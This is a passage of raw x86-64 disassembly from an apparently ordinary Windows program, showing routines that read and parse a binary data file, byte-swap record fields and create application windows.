   140001749:	48 8d 0d 24 b0 02 00 	lea    0x2b024(%rip),%rcx        # 0x14002c774
   140001750:	8b 10                	mov    (%rax),%edx
   140001752:	e8 b9 11 00 00       	call   0x140002910
   140001757:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   14000175c:	e9 ae 00 00 00       	jmp    0x14000180f
   140001761:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001766:	8b 77 0c             	mov    0xc(%rdi),%esi
   140001769:	48 85 f6             	test   %rsi,%rsi
   14000176c:	0f 84 90 00 00 00    	je     0x140001802
   140001772:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140001777:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000177e:	00 00 
   140001780:	49 3b f5             	cmp    %r13,%rsi
   140001783:	48 8b ee             	mov    %rsi,%rbp
   140001786:	4d 8b cf             	mov    %r15,%r9
   140001789:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000178f:	49 0f 47 ed          	cmova  %r13,%rbp
   140001793:	49 8b ce             	mov    %r14,%rcx
   140001796:	48 8b d5             	mov    %rbp,%rdx
   140001799:	e8 8a ec 00 00       	call   0x140010428
   14000179e:	48 83 f8 01          	cmp    $0x1,%rax
   1400017a2:	72 36                	jb     0x1400017da
   1400017a4:	4d 8b cc             	mov    %r12,%r9
   1400017a7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400017ad:	48 8b d5             	mov    %rbp,%rdx
   1400017b0:	49 8b ce             	mov    %r14,%rcx
   1400017b3:	e8 c4 f3 00 00       	call   0x140010b7c
   1400017b8:	48 83 f8 01          	cmp    $0x1,%rax
   1400017bc:	72 07                	jb     0x1400017c5
   1400017be:	48 2b f5             	sub    %rbp,%rsi
   1400017c1:	75 bd                	jne    0x140001780
   1400017c3:	eb 38                	jmp    0x1400017fd
   1400017c5:	e8 fa 39 01 00       	call   0x1400151c4
   1400017ca:	4c 8d 05 c7 b0 02 00 	lea    0x2b0c7(%rip),%r8        # 0x14002c898
   1400017d1:	48 8d 0d f4 b0 02 00 	lea    0x2b0f4(%rip),%rcx        # 0x14002c8cc
   1400017d8:	eb 13                	jmp    0x1400017ed
   1400017da:	e8 e5 39 01 00       	call   0x1400151c4
   1400017df:	4c 8d 05 72 b0 02 00 	lea    0x2b072(%rip),%r8        # 0x14002c858
   1400017e6:	48 8d 0d 9f b0 02 00 	lea    0x2b09f(%rip),%rcx        # 0x14002c88c
   1400017ed:	8b 10                	mov    (%rax),%edx
   1400017ef:	4c 8d 4f 12          	lea    0x12(%rdi),%r9
   1400017f3:	e8 18 11 00 00       	call   0x140002910
   1400017f8:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400017fd:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140001802:	49 8b ce             	mov    %r14,%rcx
   140001805:	e8 f6 39 01 00       	call   0x140015200
   14000180a:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000180f:	4c 8b 6c 24 30       	mov    0x30(%rsp),%r13
   140001814:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
   140001819:	49 8b cf             	mov    %r15,%rcx
   14000181c:	e8 ab e8 00 00       	call   0x1400100cc
   140001821:	49 8b cc             	mov    %r12,%rcx
   140001824:	e8 a3 e8 00 00       	call   0x1400100cc
   140001829:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   14000182e:	8b c3                	mov    %ebx,%eax
   140001830:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140001835:	48 83 c4 38          	add    $0x38,%rsp
   140001839:	5f                   	pop    %rdi
   14000183a:	5b                   	pop    %rbx
   14000183b:	c3                   	ret
   14000183c:	cc                   	int3
   14000183d:	cc                   	int3
   14000183e:	cc                   	int3
   14000183f:	cc                   	int3
   140001840:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001845:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000184a:	57                   	push   %rdi
   14000184b:	48 83 ec 20          	sub    $0x20,%rsp
   14000184f:	48 8b 99 08 10 00 00 	mov    0x1008(%rcx),%rbx
   140001856:	48 8b f2             	mov    %rdx,%rsi
   140001859:	48 8b f9             	mov    %rcx,%rdi
   14000185c:	48 3b 99 10 10 00 00 	cmp    0x1010(%rcx),%rbx
   140001863:	73 70                	jae    0x1400018d5
   140001865:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000186c:	00 00 00 00 
   140001870:	44 0f b6 43 11       	movzbl 0x11(%rbx),%r8d
   140001875:	41 8d 40 a6          	lea    -0x5a(%r8),%eax
   140001879:	a8 f7                	test   $0xf7,%al
   14000187b:	74 3a                	je     0x1400018b7
   14000187d:	41 80 f8 64          	cmp    $0x64,%r8b
   140001881:	74 34                	je     0x1400018b7
   140001883:	41 80 f8 6e          	cmp    $0x6e,%r8b
   140001887:	74 2e                	je     0x1400018b7
   140001889:	41 80 f8 78          	cmp    $0x78,%r8b
   14000188d:	74 28                	je     0x1400018b7
   14000188f:	48 8d 43 12          	lea    0x12(%rbx),%rax
   140001893:	4c 8b c6             	mov    %rsi,%r8
   140001896:	4c 2b c0             	sub    %rax,%r8
   140001899:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400018a0:	0f b6 10             	movzbl (%rax),%edx
   1400018a3:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   1400018a8:	2b d1                	sub    %ecx,%edx
   1400018aa:	75 07                	jne    0x1400018b3
   1400018ac:	48 ff c0             	inc    %rax
   1400018af:	85 c9                	test   %ecx,%ecx
   1400018b1:	75 ed                	jne    0x1400018a0
   1400018b3:	85 d2                	test   %edx,%edx
   1400018b5:	eb 0e                	jmp    0x1400018c5
   1400018b7:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   1400018bb:	48 8b d6             	mov    %rsi,%rdx
   1400018be:	e8 2d 3a 01 00       	call   0x1400152f0
   1400018c3:	85 c0                	test   %eax,%eax
   1400018c5:	74 20                	je     0x1400018e7
   1400018c7:	8b 03                	mov    (%rbx),%eax
   1400018c9:	48 03 d8             	add    %rax,%rbx
   1400018cc:	48 3b 9f 10 10 00 00 	cmp    0x1010(%rdi),%rbx
   1400018d3:	72 9b                	jb     0x140001870
   1400018d5:	33 c0                	xor    %eax,%eax
   1400018d7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400018dc:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400018e1:	48 83 c4 20          	add    $0x20,%rsp
   1400018e5:	5f                   	pop    %rdi
   1400018e6:	c3                   	ret
   1400018e7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400018ec:	48 8b c3             	mov    %rbx,%rax
   1400018ef:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400018f4:	48 83 c4 20          	add    $0x20,%rsp
   1400018f8:	5f                   	pop    %rdi
   1400018f9:	c3                   	ret
   1400018fa:	cc                   	int3
   1400018fb:	cc                   	int3
   1400018fc:	cc                   	int3
   1400018fd:	cc                   	int3
   1400018fe:	cc                   	int3
   1400018ff:	cc                   	int3
   140001900:	40 53                	rex push %rbx
   140001902:	48 83 ec 20          	sub    $0x20,%rsp
   140001906:	48 8b 19             	mov    (%rcx),%rbx
   140001909:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
   140001910:	48 85 db             	test   %rbx,%rbx
   140001913:	74 19                	je     0x14000192e
   140001915:	48 8b 8b 08 10 00 00 	mov    0x1008(%rbx),%rcx
   14000191c:	e8 df 38 01 00       	call   0x140015200
   140001921:	48 8b cb             	mov    %rbx,%rcx
   140001924:	48 83 c4 20          	add    $0x20,%rsp
   140001928:	5b                   	pop    %rbx
   140001929:	e9 d2 38 01 00       	jmp    0x140015200
   14000192e:	48 83 c4 20          	add    $0x20,%rsp
   140001932:	5b                   	pop    %rbx
   140001933:	c3                   	ret
   140001934:	cc                   	int3
   140001935:	cc                   	int3
   140001936:	cc                   	int3
   140001937:	cc                   	int3
   140001938:	cc                   	int3
   140001939:	cc                   	int3
   14000193a:	cc                   	int3
   14000193b:	cc                   	int3
   14000193c:	cc                   	int3
   14000193d:	cc                   	int3
   14000193e:	cc                   	int3
   14000193f:	cc                   	int3
   140001940:	8b 02                	mov    (%rdx),%eax
   140001942:	48 03 c2             	add    %rdx,%rax
   140001945:	c3                   	ret
   140001946:	cc                   	int3
   140001947:	cc                   	int3
   140001948:	cc                   	int3
   140001949:	cc                   	int3
   14000194a:	cc                   	int3
   14000194b:	cc                   	int3
   14000194c:	cc                   	int3
   14000194d:	cc                   	int3
   14000194e:	cc                   	int3
   14000194f:	cc                   	int3
   140001950:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140001955:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   14000195a:	57                   	push   %rdi
   14000195b:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001962:	48 8b 05 d7 d6 03 00 	mov    0x3d6d7(%rip),%rax        # 0x14003f040
   140001969:	48 33 c4             	xor    %rsp,%rax
   14000196c:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   140001973:	00 
   140001974:	48 8d 15 59 af 02 00 	lea    0x2af59(%rip),%rdx        # 0x14002c8d4
   14000197b:	48 8b e9             	mov    %rcx,%rbp
   14000197e:	33 db                	xor    %ebx,%ebx
   140001980:	e8 4b 2c 00 00       	call   0x1400045d0
   140001985:	48 8b f8             	mov    %rax,%rdi
   140001988:	48 85 c0             	test   %rax,%rax
   14000198b:	0f 84 bd 02 00 00    	je     0x140001c4e
   140001991:	48 8b 05 f0 cb 02 00 	mov    0x2cbf0(%rip),%rax        # 0x14002e588
   140001998:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   14000199f:	00 
   1400019a0:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   1400019a7:	00 
   1400019a8:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400019ae:	48 c1 e8 18          	shr    $0x18,%rax
   1400019b2:	48 8b cf             	mov    %rdi,%rcx
   1400019b5:	04 0c                	add    $0xc,%al
   1400019b7:	48 89 b4 24 a8 00 00 	mov    %rsi,0xa8(%rsp)
   1400019be:	00 
   1400019bf:	88 84 24 83 00 00 00 	mov    %al,0x83(%rsp)
   1400019c6:	e8 c5 65 00 00       	call   0x140007f90
   1400019cb:	48 8b f0             	mov    %rax,%rsi
   1400019ce:	48 85 c0             	test   %rax,%rax
   1400019d1:	0f 84 64 02 00 00    	je     0x140001c3b
   1400019d7:	45 33 c0             	xor    %r8d,%r8d
   1400019da:	48 8b d0             	mov    %rax,%rdx
   1400019dd:	48 8b cf             	mov    %rdi,%rcx
   1400019e0:	e8 8f ed 00 00       	call   0x140010774
   1400019e5:	85 c0                	test   %eax,%eax
   1400019e7:	79 1f                	jns    0x140001a08
   1400019e9:	e8 d6 37 01 00       	call   0x1400151c4
   1400019ee:	4c 8d 05 1b b0 02 00 	lea    0x2b01b(%rip),%r8        # 0x14002ca10
   1400019f5:	48 8d 0d 50 af 02 00 	lea    0x2af50(%rip),%rcx        # 0x14002c94c
   1400019fc:	8b 10                	mov    (%rax),%edx
   1400019fe:	e8 0d 0f 00 00       	call   0x140002910
   140001a03:	e9 33 02 00 00       	jmp    0x140001c3b
   140001a08:	4c 8b cf             	mov    %rdi,%r9
   140001a0b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001a10:	ba 58 00 00 00       	mov    $0x58,%edx
   140001a15:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001a1b:	e8 08 ea 00 00       	call   0x140010428
   140001a20:	48 83 f8 01          	cmp    $0x1,%rax
   140001a24:	73 1f                	jae    0x140001a45
   140001a26:	e8 99 37 01 00       	call   0x1400151c4
   140001a2b:	4c 8d 05 06 b0 02 00 	lea    0x2b006(%rip),%r8        # 0x14002ca38
   140001a32:	48 8d 0d 53 ae 02 00 	lea    0x2ae53(%rip),%rcx        # 0x14002c88c
   140001a39:	8b 10                	mov    (%rax),%edx
   140001a3b:	e8 d0 0e 00 00       	call   0x140002910
   140001a40:	e9 f6 01 00 00       	jmp    0x140001c3b
   140001a45:	ba 70 10 00 00       	mov    $0x1070,%edx
   140001a4a:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001a4f:	e8 9c 37 01 00       	call   0x1400151f0
   140001a54:	48 8b d8             	mov    %rax,%rbx
   140001a57:	48 85 c0             	test   %rax,%rax
   140001a5a:	75 1f                	jne    0x140001a7b
   140001a5c:	e8 63 37 01 00       	call   0x1400151c4
   140001a61:	4c 8d 05 e8 af 02 00 	lea    0x2afe8(%rip),%r8        # 0x14002ca50
   140001a68:	48 8d 0d 15 b0 02 00 	lea    0x2b015(%rip),%rcx        # 0x14002ca84
   140001a6f:	8b 10                	mov    (%rax),%edx
   140001a71:	e8 9a 0e 00 00       	call   0x140002910
   140001a76:	e9 c0 01 00 00       	jmp    0x140001c3b
   140001a7b:	4c 8b cd             	mov    %rbp,%r9
   140001a7e:	4c 8d 05 07 b0 02 00 	lea    0x2b007(%rip),%r8        # 0x14002ca8c
   140001a85:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001a8a:	48 8b cb             	mov    %rbx,%rcx
   140001a8d:	e8 ee 01 00 00       	call   0x140001c80
   140001a92:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140001a96:	48 8d 8b 2c 10 00 00 	lea    0x102c(%rbx),%rcx
   140001a9d:	0f c8                	bswap  %eax
   140001a9f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140001aa3:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   140001aa8:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   140001aac:	4c 8d 05 d9 af 02 00 	lea    0x2afd9(%rip),%r8        # 0x14002ca8c
   140001ab3:	0f c8                	bswap  %eax
   140001ab5:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140001ab9:	ba 40 00 00 00       	mov    $0x40,%edx
   140001abe:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140001ac2:	0f c8                	bswap  %eax
   140001ac4:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140001ac8:	8b 44 24 34          	mov    0x34(%rsp),%eax
   140001acc:	0f c8                	bswap  %eax
   140001ace:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140001ad2:	89 83 28 10 00 00    	mov    %eax,0x1028(%rbx)
   140001ad8:	e8 a3 01 00 00       	call   0x140001c80
   140001add:	8b 44 24 28          	mov    0x28(%rsp),%eax
   140001ae1:	45 33 c0             	xor    %r8d,%r8d
   140001ae4:	48 2b f0             	sub    %rax,%rsi
   140001ae7:	48 8b cf             	mov    %rdi,%rcx
   140001aea:	48 8d 46 58          	lea    0x58(%rsi),%rax
   140001aee:	48 89 83 00 10 00 00 	mov    %rax,0x1000(%rbx)
   140001af5:	8b 54 24 2c          	mov    0x2c(%rsp),%edx
   140001af9:	48 03 d0             	add    %rax,%rdx
   140001afc:	e8 73 ec 00 00       	call   0x140010774
   140001b01:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140001b05:	e8 06 37 01 00       	call   0x140015210
   140001b0a:	48 89 83 08 10 00 00 	mov    %rax,0x1008(%rbx)
   140001b11:	48 85 c0             	test   %rax,%rax
   140001b14:	75 1f                	jne    0x140001b35
   140001b16:	e8 a9 36 01 00       	call   0x1400151c4
   140001b1b:	4c 8d 05 6e af 02 00 	lea    0x2af6e(%rip),%r8        # 0x14002ca90
   140001b22:	48 8d 0d 4b ac 02 00 	lea    0x2ac4b(%rip),%rcx        # 0x14002c774
   140001b29:	8b 10                	mov    (%rax),%edx
   140001b2b:	e8 e0 0d 00 00       	call   0x140002910
   140001b30:	e9 06 01 00 00       	jmp    0x140001c3b
   140001b35:	8b 54 24 30          	mov    0x30(%rsp),%edx
   140001b39:	4c 8b cf             	mov    %rdi,%r9
   140001b3c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001b42:	48 8b c8             	mov    %rax,%rcx
   140001b45:	e8 de e8 00 00       	call   0x140010428
   140001b4a:	48 83 f8 01          	cmp    $0x1,%rax
   140001b4e:	73 1f                	jae    0x140001b6f
   140001b50:	e8 6f 36 01 00       	call   0x1400151c4
   140001b55:	4c 8d 05 5c af 02 00 	lea    0x2af5c(%rip),%r8        # 0x14002cab8
   140001b5c:	48 8d 0d 29 ad 02 00 	lea    0x2ad29(%rip),%rcx        # 0x14002c88c
   140001b63:	8b 10                	mov    (%rax),%edx
   140001b65:	e8 a6 0d 00 00       	call   0x140002910
   140001b6a:	e9 cc 00 00 00       	jmp    0x140001c3b
   140001b6f:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140001b73:	48 8b cf             	mov    %rdi,%rcx
   140001b76:	48 03 83 08 10 00 00 	add    0x1008(%rbx),%rax
   140001b7d:	48 89 83 10 10 00 00 	mov    %rax,0x1010(%rbx)
   140001b84:	e8 07 e6 00 00       	call   0x140010190
   140001b89:	85 c0                	test   %eax,%eax
   140001b8b:	74 11                	je     0x140001b9e
   140001b8d:	48 8d 0d 44 af 02 00 	lea    0x2af44(%rip),%rcx        # 0x14002cad8
   140001b94:	e8 77 0b 00 00       	call   0x140002710
   140001b99:	e9 9d 00 00 00       	jmp    0x140001c3b
   140001b9e:	48 8b 93 08 10 00 00 	mov    0x1008(%rbx),%rdx
   140001ba5:	48 3b 93 10 10 00 00 	cmp    0x1010(%rbx),%rdx
   140001bac:	0f 83 89 00 00 00    	jae    0x140001c3b
   140001bb2:	44 8b 05 5f d4 03 00 	mov    0x3d45f(%rip),%r8d        # 0x14003f018
   140001bb9:	66 0f 6f 0d 2f af 02 	movdqa 0x2af2f(%rip),%xmm1        # 0x14002caf0
   140001bc0:	00 
   140001bc1:	33 c0                	xor    %eax,%eax
   140001bc3:	41 83 f8 02          	cmp    $0x2,%r8d
   140001bc7:	7c 17                	jl     0x140001be0
   140001bc9:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140001bcd:	66 0f 38 00 c1       	pshufb %xmm1,%xmm0
   140001bd2:	f3 0f 7f 02          	movdqu %xmm0,(%rdx)
   140001bd6:	eb 19                	jmp    0x140001bf1
   140001bd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001bdf:	00 
   140001be0:	8b 0c 82             	mov    (%rdx,%rax,4),%ecx
   140001be3:	0f c9                	bswap  %ecx
   140001be5:	89 0c 82             	mov    %ecx,(%rdx,%rax,4)
   140001be8:	48 ff c0             	inc    %rax
   140001beb:	48 83 f8 04          	cmp    $0x4,%rax
   140001bef:	7c ef                	jl     0x140001be0
   140001bf1:	0f b6 4a 11          	movzbl 0x11(%rdx),%ecx
   140001bf5:	8d 41 a6             	lea    -0x5a(%rcx),%eax
   140001bf8:	a8 f7                	test   $0xf7,%al
   140001bfa:	74 13                	je     0x140001c0f
   140001bfc:	80 f9 64             	cmp    $0x64,%cl
   140001bff:	74 0e                	je     0x140001c0f
   140001c01:	80 f9 6e             	cmp    $0x6e,%cl
   140001c04:	74 09                	je     0x140001c0f
   140001c06:	80 f9 78             	cmp    $0x78,%cl
   140001c09:	74 04                	je     0x140001c0f
   140001c0b:	32 c0                	xor    %al,%al
   140001c0d:	eb 02                	jmp    0x140001c11
   140001c0f:	b0 01                	mov    $0x1,%al
   140001c11:	0a 83 18 10 00 00    	or     0x1018(%rbx),%al
   140001c17:	0f 95 c0             	setne  %al
   140001c1a:	88 83 18 10 00 00    	mov    %al,0x1018(%rbx)
   140001c20:	80 7a 11 6c          	cmpb   $0x6c,0x11(%rdx)
   140001c24:	75 07                	jne    0x140001c2d
   140001c26:	48 89 93 20 10 00 00 	mov    %rdx,0x1020(%rbx)
   140001c2d:	8b 02                	mov    (%rdx),%eax
   140001c2f:	48 03 d0             	add    %rax,%rdx
   140001c32:	48 3b 93 10 10 00 00 	cmp    0x1010(%rbx),%rdx
   140001c39:	72 86                	jb     0x140001bc1
   140001c3b:	48 8b cf             	mov    %rdi,%rcx
   140001c3e:	e8 89 e4 00 00       	call   0x1400100cc
   140001c43:	48 8b b4 24 a8 00 00 	mov    0xa8(%rsp),%rsi
   140001c4a:	00 
   140001c4b:	48 8b c3             	mov    %rbx,%rax
   140001c4e:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   140001c55:	00 
   140001c56:	48 33 cc             	xor    %rsp,%rcx
   140001c59:	e8 72 a9 00 00       	call   0x14000c5d0
   140001c5e:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140001c65:	00 
   140001c66:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140001c6a:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   140001c6e:	49 8b e3             	mov    %r11,%rsp
   140001c71:	5f                   	pop    %rdi
   140001c72:	c3                   	ret
   140001c73:	cc                   	int3
   140001c74:	cc                   	int3
   140001c75:	cc                   	int3
   140001c76:	cc                   	int3
   140001c77:	cc                   	int3
   140001c78:	cc                   	int3
   140001c79:	cc                   	int3
   140001c7a:	cc                   	int3
   140001c7b:	cc                   	int3
   140001c7c:	cc                   	int3
   140001c7d:	cc                   	int3
   140001c7e:	cc                   	int3
   140001c7f:	cc                   	int3
   140001c80:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001c85:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001c8a:	53                   	push   %rbx
   140001c8b:	55                   	push   %rbp
   140001c8c:	56                   	push   %rsi
   140001c8d:	57                   	push   %rdi
   140001c8e:	48 83 ec 38          	sub    $0x38,%rsp
   140001c92:	49 8b f0             	mov    %r8,%rsi
   140001c95:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   140001c9a:	48 8b da             	mov    %rdx,%rbx
   140001c9d:	48 8b f9             	mov    %rcx,%rdi
   140001ca0:	e8 9b f3 ff ff       	call   0x140001040
   140001ca5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140001caa:	4c 8b ce             	mov    %rsi,%r9
   140001cad:	4c 8b c3             	mov    %rbx,%r8
   140001cb0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001cb7:	00 00 
   140001cb9:	48 8b d7             	mov    %rdi,%rdx
   140001cbc:	48 8b 08             	mov    (%rax),%rcx
   140001cbf:	48 83 c9 02          	or     $0x2,%rcx
   140001cc3:	e8 0c 2f 01 00       	call   0x140014bd4
   140001cc8:	85 c0                	test   %eax,%eax
   140001cca:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140001ccf:	0f 48 c1             	cmovs  %ecx,%eax
   140001cd2:	48 83 c4 38          	add    $0x38,%rsp
   140001cd6:	5f                   	pop    %rdi
   140001cd7:	5e                   	pop    %rsi
   140001cd8:	5d                   	pop    %rbp
   140001cd9:	5b                   	pop    %rbx
   140001cda:	c3                   	ret
   140001cdb:	cc                   	int3
   140001cdc:	cc                   	int3
   140001cdd:	cc                   	int3
   140001cde:	cc                   	int3
   140001cdf:	cc                   	int3
   140001ce0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001ce5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140001cea:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001cef:	57                   	push   %rdi
   140001cf0:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   140001cf7:	48 8b 05 42 d3 03 00 	mov    0x3d342(%rip),%rax        # 0x14003f040
   140001cfe:	48 33 c4             	xor    %rsp,%rax
   140001d01:	48 89 84 24 70 02 00 	mov    %rax,0x270(%rsp)
   140001d08:	00 
   140001d09:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140001d0d:	4c 8d 05 ec ad 02 00 	lea    0x2adec(%rip),%r8        # 0x14002cb00
   140001d14:	4c 8b 49 10          	mov    0x10(%rcx),%r9
   140001d18:	48 8b f9             	mov    %rcx,%rdi
   140001d1b:	48 83 c1 28          	add    $0x28,%rcx
   140001d1f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001d24:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001d29:	e8 92 08 00 00       	call   0x1400025c0
   140001d2e:	ff 15 4c a7 02 00    	call   *0x2a74c(%rip)        # 0x14002c480
   140001d34:	0f b7 c8             	movzwl %ax,%ecx
   140001d37:	ba 32 00 00 00       	mov    $0x32,%edx
   140001d3c:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001d42:	8b d8                	mov    %eax,%ebx
   140001d44:	ff 15 76 a3 02 00    	call   *0x2a376(%rip)        # 0x14002c0c0
   140001d4a:	48 c1 eb 10          	shr    $0x10,%rbx
   140001d4e:	ba 0e 00 00 00       	mov    $0xe,%edx
   140001d53:	0f b7 cb             	movzwl %bx,%ecx
   140001d56:	bb 08 00 00 00       	mov    $0x8,%ebx
   140001d5b:	44 8b c3             	mov    %ebx,%r8d
   140001d5e:	66 89 87 5a 20 00 00 	mov    %ax,0x205a(%rdi)
   140001d65:	ff 15 55 a3 02 00    	call   *0x2a355(%rip)        # 0x14002c0c0
   140001d6b:	33 d2                	xor    %edx,%edx
   140001d6d:	c7 87 5e 20 00 00 20 	movl   $0x200020,0x205e(%rdi)
   140001d74:	00 20 00 
   140001d77:	41 b8 f4 01 00 00    	mov    $0x1f4,%r8d
   140001d7d:	66 89 87 5c 20 00 00 	mov    %ax,0x205c(%rdi)
   140001d84:	48 8d 4c 24 74       	lea    0x74(%rsp),%rcx
   140001d89:	66 89 9f 58 20 00 00 	mov    %bx,0x2058(%rdi)
   140001d90:	e8 0b 8a 02 00       	call   0x14002a7a0
   140001d95:	45 33 c9             	xor    %r9d,%r9d
   140001d98:	c7 44 24 70 f8 01 00 	movl   $0x1f8,0x70(%rsp)
   140001d9f:	00 
   140001da0:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140001da5:	ba f8 01 00 00       	mov    $0x1f8,%edx
   140001daa:	b9 29 00 00 00       	mov    $0x29,%ecx
   140001daf:	ff 15 83 a6 02 00    	call   *0x2a683(%rip)        # 0x14002c438
   140001db5:	33 ed                	xor    %ebp,%ebp
   140001db7:	85 c0                	test   %eax,%eax
   140001db9:	74 10                	je     0x140001dcb
   140001dbb:	48 8d 8c 24 08 02 00 	lea    0x208(%rsp),%rcx
   140001dc2:	00 
   140001dc3:	ff 15 7f a2 02 00    	call   *0x2a27f(%rip)        # 0x14002c048
   140001dc9:	eb 03                	jmp    0x140001dce
   140001dcb:	48 8b c5             	mov    %rbp,%rax
   140001dce:	4c 8d 8f 50 20 00 00 	lea    0x2050(%rdi),%r9
   140001dd5:	48 89 87 48 20 00 00 	mov    %rax,0x2048(%rdi)
   140001ddc:	ba 01 7f 00 00       	mov    $0x7f01,%edx
   140001de1:	33 c9                	xor    %ecx,%ecx
   140001de3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001de9:	ff 15 39 a2 02 00    	call   *0x2a239(%rip)        # 0x14002c028
   140001def:	48 8b 07             	mov    (%rdi),%rax
   140001df2:	48 8d 15 87 ad 02 00 	lea    0x2ad87(%rip),%rdx        # 0x14002cb80
   140001df9:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001dfe:	41 b9 03 00 00 50    	mov    $0x50000003,%r9d
   140001e04:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001e09:	45 33 c0             	xor    %r8d,%r8d
   140001e0c:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001e10:	33 c9                	xor    %ecx,%ecx
   140001e12:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001e17:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001e1c:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001e23:	80 
   140001e24:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001e2b:	80 
   140001e2c:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001e33:	80 
   140001e34:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001e3b:	80 
   140001e3c:	ff 15 86 a5 02 00    	call   *0x2a586(%rip)        # 0x14002c3c8
   140001e42:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001e47:	48 8d 15 32 ad 02 00 	lea    0x2ad32(%rip),%rdx        # 0x14002cb80
   140001e4e:	48 89 87 28 20 00 00 	mov    %rax,0x2028(%rdi)
   140001e55:	41 b9 00 00 00 50    	mov    $0x50000000,%r9d
   140001e5b:	48 8b 07             	mov    (%rdi),%rax
   140001e5e:	45 33 c0             	xor    %r8d,%r8d
   140001e61:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001e66:	33 c9                	xor    %ecx,%ecx
   140001e68:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140001e6c:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140001e71:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001e76:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140001e7d:	80 
   140001e7e:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140001e85:	80 
   140001e86:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140001e8d:	80 
   140001e8e:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140001e95:	80 
   140001e96:	ff 15 2c a5 02 00    	call   *0x2a52c(%rip)        # 0x14002c3c8
   140001e9c:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001ea1:	48 8d 15 e8 ac 02 00 	lea    0x2ace8(%rip),%rdx        # 0x14002cb90
   140001ea8:	48 89 87 30 20 00 00 	mov    %rax,0x2030(%rdi)
